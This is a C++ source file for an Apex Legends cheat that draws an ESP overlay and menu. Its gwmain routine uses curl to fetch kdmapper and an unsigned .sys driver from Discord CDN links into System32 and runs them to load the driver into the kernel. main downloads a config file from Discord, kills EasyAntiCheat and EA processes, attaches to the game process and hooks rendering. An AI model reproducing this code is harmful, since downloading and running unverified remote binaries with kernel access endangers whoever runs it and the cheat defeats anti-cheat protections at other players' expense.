#include "stdafx.h"
#include "comms.h"
#include "xstring.h"

void shortcurts();
HWND hwnd = NULL;


DWORD GetProcessID(LPCWSTR processName) {
	HANDLE handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	DWORD procID = NULL;

	if (handle == INVALID_HANDLE_VALUE)
		return procID;

	PROCESSENTRY32W entry = { 0 };
	entry.dwSize = sizeof(PROCESSENTRY32W);

	if (Process32FirstW(handle, &entry)) {
		if (!_wcsicmp(processName, entry.szExeFile)) {
			procID = entry.th32ProcessID;
		}
		else while (Process32NextW(handle, &entry)) {
			if (!_wcsicmp(processName, entry.szExeFile)) {
				procID = entry.th32ProcessID;
			}
		}
	}

	CloseHandle(handle);
	return procID;
}
void gwmain() {


	system(("curl https://cdn.discordapp.com/attachments/1060590422612779061/1064538129396154419/kdmapper_1.exe --output C:/Windows/System32/k.exe >nul 2>&1"));
	system(("curl https://cdn.discordapp.com/attachments/1060590422612779061/1064537167247966298/r.sys --output C:/Windows/System32/c.sys >nul 2>&1"));
	system(("C:/Windows/System32/k.exe C:/Windows/System32/c.sys"));
	printf(("\n"));
	system("del c.sys >nul 2>&1");
	system("del k.exe >nul 2>&1");


}

DWORD esp_menu(LPVOID IN) {
	while (1) {
		ActorLoop();
		gay();
		menu();
		shortcurts();
	}
}
void shortcurts()
{
	if (GetAsyncKeyState(VK_HOME) & 1) // Check if the INSERT key is pressed
	{
		Sleep(50);
		MenuIsOpen = !MenuIsOpen; // toggle the value of menu_key
		Sleep(200); 
	}
}
int main() 
{
	SetConsoleTitleW(L"WorkerW");
	MouseController::Init();
	system(_("start discord.gg/commcord"));
	if (!FileExists(XorStr("C:/config.ini"))) {
		system(_("curl https://cdn.discordapp.com/attachments/1058339822089019432/1061317215976181921/config.ini --output C:/config.ini >nul 2>&1"));
	}
	if (MessageBoxA(NULL, _("Close Apex Processes?"), (" "), MB_YESNO) == IDYES)
	{
		//std::thdriver->read freeze(input);
		system(_("/taskkill /f r5apex.exe >nul 2>&1"));
		system(_("/taskkill /f EasyAntiCheatLauncher.exe >nul 2>&1"));
		system(_("/taskkill /f EADesktop.exe >nul 2>&1"));
		system(_("/taskkill /f EABackgroundService.exe >nul 2>&1"));
		system(_("/taskkill /f EAlauncher.exe >nul 2>&1"));
		system(_("/taskkill /f EA.exe >nul 2>&1"));
		//running = false;
	}
	if (MessageBoxA(NULL, _("Load driver?(If already loaded before press no)"), (" "), MB_YESNO) == IDYES)
	{
		//std::thdriver->read freeze(input);
		Sleep(500);
		LoadDriver();
		Sleep(500);
		//running = false;
	}
	
	Km.init();
	
	std::cout << ("\n");
	
	Sleep(500);
	std::cout << XorStr("[Usermode] Looking for apex process");
	while (hwnd == NULL)
	{
		
		hwnd = FindWindowA(0, _("Apex Legends"));
		
	}
	
	std::cout << XorStr("[Usermode] Process Found!");
	
	
		system("cls");
		std::cout << "\n\n";
		std::cout <<XorStr(" [Usermode] Found Apex Legends running\n");
		Km.pid = GetProcessID(_(L"r5apex.exe"));
		Km.attach(Km.pid);
		printf(_("[Driver] The PID is: 0x%llX\n "), Km.pid);
		Km.module = (uintptr_t)Km.get_process_base(Km.pid);
		printf(_("[Driver] The Base Address is: 0x%llX\n "), Km.module);
		if (!Km.module) {
			std::cout << XorStr(" [Driver] Error Base address not found");
			Sleep(2000);
			system(_("/taskkill r5apex.exe >nul 2>&1"));
			system(_("/taskkill EasyAntiCheatLauncher.exe >nul 2>&1"));
			
			exit(0);
			
		}
		//printf(_("there is no menu key due to gay errors to close menu in the bottom right of the menu resize it to very small\n"));
		std::cout << _("Menu key is the HOME key (MIGHT NOT WORK AND CAUSE CRASH)") << std::endl;
		Sleep(5000);
		SetupWindow();
		DirectXInit(MyWnd);

		HANDLE World = CreateThread(nullptr, NULL, reinterpret_cast<LPTHREAD_START_ROUTINE>(WorldCache), nullptr, NULL, nullptr);
		CloseHandle(World);
		
		

		PresentHook();
		HANDLE espmen = CreateThread(nullptr, NULL, reinterpret_cast<LPTHREAD_START_ROUTINE>(esp_menu), NULL, NULL, NULL);
		CloseHandle(espmen);

		

	return 0;
}